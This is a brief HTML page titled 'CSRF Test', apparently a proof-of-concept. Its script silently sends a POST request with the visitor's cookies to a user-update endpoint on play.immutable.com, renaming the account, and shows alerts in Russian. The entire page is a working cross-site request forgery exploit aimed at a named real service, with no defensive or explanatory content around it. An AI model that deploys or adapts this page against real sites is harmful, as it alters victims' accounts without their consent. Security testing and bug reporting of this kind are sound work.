<!DOCTYPE html>
<html>
  <body>
    <h1>CSRF Test</h1>
    <script>
      fetch("https://play.immutable.com/api/user/update", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          name: "CSRF ✅"
        }),
        credentials: "include"
      })
      .then(res => res.text())
      .then(text => {
        console.log("Response:", text);
        alert("CSRF запрос отправлен!");
      })
      .catch(err => {
        console.error("Ошибка:", err);
        alert("Ошибка при отправке запроса");
      });
    </script>
  </body>
</html>
